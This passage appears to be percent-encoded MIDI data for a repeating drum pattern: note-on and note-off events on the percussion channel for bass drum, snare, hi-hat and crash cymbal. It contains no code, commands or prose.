1%70%89%23%50%00%24%50%00%24%50%00%31%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%83%60%89%23%50%00%24%50%00%24%50%78%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%82%68%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%82%68%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%28%7F%81%70%89%26%50%00%28%50%00%99%26%7F%00%28%7F%81%70%89%26%50%00%28%50%00%99%23%7F%00%24%7F%00%24%5F%00%31%6F%81%70%89%23%50%00%24%50%00%24%50%00%31%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%83%60%89%23%50%00%24%50%00%24%50%78%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%82%68%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%82%68%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%28%7F%81%70%89%26%50%00%28%50%00%99%26%7F%00%28%7F%81%70%89%26%50%00%28%50%00%99%23%7F%00%24%7F%00%24%5F%00%31%6F%81%70%89%23%50%00%24%50%00%24%50%00%31%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%83%60%89%23%50%00%24%50%00%24%50%78%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%82%68%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%82%68%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%28%7F%81%70%89%26%50%00%28%50%00%99%26%7F%00%28%7F%81%70%89%26%50%00%28%50%00%99%23%7F%00%24%7F%00%24%5F%00%31%6F%81%70%89%23%50%00%24%50%00%24%50%00%31%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%83%60%89%23%50%00%24%50%00%24%50%00%2C%50%78%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%78%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%82%68%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%78%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%82%68%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%81%70%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%28%7F%81%70%89%26%50%00%28%50%00%99%26%7F%00%28%7F%81%70%89%26%50%00%28%50%00%99%23%7F%00%24%7F%00%24%5F%00%31%6F%81%70%89%23%50%00%24%50%00%24%50%00%31%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%83%60%89%23%50%00%24%50%00%24%50%00%2C%50%78%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%78%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%82%68%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%78%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%82%68%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%81%70%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%28%7F%81%70%89%26%50%00%28%50%00%99%26%7F%00%28%7F%81%70%89%26%50%00%28%50%00%99%23%7F%00%24%7F%00%24%5F%00%31%6F%81%70%89%23%50%00%24%50%00%24%50%00%31%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%83%60%89%23%50%00%24%50%00%24%50%00%2C%50%78%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%78%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%82%68%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%78%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%82%68%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%81%70%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%28%7F%81%70%89%26%50%00%28%50%00%99%26%7F%00%28%7F%81%70%89%26%50%00%28%50%00%99%23%7F%00%24%7F%00%24%5F%00%31%6F%81%70%89%23%50%00%24%50%00%24%50%00%31%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%83%60%89%23%50%00%24%50%00%24%50%00%2C%50%78%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%78%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%82%68%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%78%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%82%68%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%81%70%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%28%7F%81%70%89%26%50%00%28%50%00%99%26%7F%00%28%7F%81%70%89%26%50%00%28%50%00%99%23%7F%00%24%7F%00%24%5F%00%31%6F%81%70%89%23%50%00%24%50%00%24%50%00%31%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%83%60%89%23%50%00%24%50%00%24%50%00%2C%50%78%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%78%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%82%68%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%78%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%82%68%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%81%70%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%28%7F%81%70%89%26%50%00%28%50%00%99%26%7F%00%28%7F%81%70%89%26%50%00%28%50%00%99%23%7F%00%24%7F%00%24%5F%00%31%6F%81%70%89%23%50%00%24%50%00%24%50%00%31%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%83%60%89%23%50%00%24%50%00%24%50%00%2C%50%78%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%78%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%82%68%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%78%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%82%68%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%81%70%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%28%7F%81%70%89%26%50%00%28%50%00%99%26%7F%00%28%7F%81%70%89%26%50%00%28%50%00%99%23%7F%00%24%7F%00%24%5F%00%31%6F%81%70%89%23%50%00%24%50%00%24%50%00%31%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%83%60%89%23%50%00%24%50%00%24%50%00%2C%50%78%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%78%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%82%68%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%78%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%82%68%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%81%70%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%28%7F%81%70%89%26%50%00%28%50%00%99%26%7F%00%28%7F%81%70%89%26%50%00%28%50%00%99%23%7F%00%24%7F%00%24%5F%00%31%6F%81%70%89%23%50%00%24%50%00%24%50%00%31%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%83%60%89%23%50%00%24%50%00%24%50%00%2C%50%78%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%78%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%78%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%7F%82%68%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%26%7F%00%28%7F%83%60%89%26%50%00%28%50%00%99%23%7F%00%24%7F%83%60%89%23%50%00%24%50%00%99%26%7F%00%27%4F%82%68%89%26%50%00%27%50%00%99%23%7F%00%24%7F%82%68%89%23%50%00%24%50%00%99%23%5F%81%70%89%23%50%00%99%26%7F%00%27%4F%83%60%89%26%50%00%27%50%00%99%23%7F%00%24%7F%83%60%89%23%50%00%24%50%00%99%26%7F%00%27%4F%82%68%89%26%50%00%27%50%00%99%23%7F%00%24%7F%82%68%89%23%50%00%24%50%00%99%23%3F%81%70%89%23%50%00%99%26%7F%00%27%4F%83%60%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%31%6F%78%89%23%50%00%24%50%00%24%50%00%31%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%5F%78%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%5F%81%70%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%00%31%6F%78%89%23%50%00%24%50%00%24%50%00%31%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%5F%78%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%83%60%99%23%7F%00%24%7F%00%24%5F%00%31%6F%78%89%23%50%00%24%50%00%24%50%00%31%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%5F%78%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%5F%81%70%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%00%31%6F%78%89%23%50%00%24%50%00%24%50%00%31%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81%70%89%26%50%00%27%50%00%99%23%7F%00%24%7F%00%24%5F%00%2C%5F%78%89%23%50%00%24%50%00%24%50%00%2C%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%78%89%23%50%00%24%50%00%24%50%00%99%23%7F%00%24%7F%00%24%5F%81%70%89%23%50%00%24%50%00%24%50%00%99%26%7F%00%27%4F%81